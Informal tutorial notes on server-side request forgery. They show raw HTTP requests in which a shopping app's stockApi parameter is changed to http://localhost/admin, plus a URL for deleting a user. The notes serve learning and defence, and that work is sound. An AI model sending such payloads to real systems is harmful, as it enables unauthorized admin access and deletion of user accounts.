Server side request forgery is a web application vulnerability that allows the server side aplication to make  HTTP requests to an arbitrary domain of the attacker's choosing.

#### SSRF attacks against the server itself

In an SSRF attack against the server itself, the attacker induces the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface.
This will typically involve supplying a URL with a hostname like 127.0.0.1 (a reserved IP address that points to the loopback adapter) or localhost.
for example:
````
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
````
The above shopping application checks its stock status by requesting various back-end REST APIs so the request goes into the "stockApi" variable through frontend HTTP requests and 
by modiifng the "stockApi" variable into "http://localhost/admin"
````
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
````
Now if u can delete a user by "http://localhost/admin/delete?username=user1"
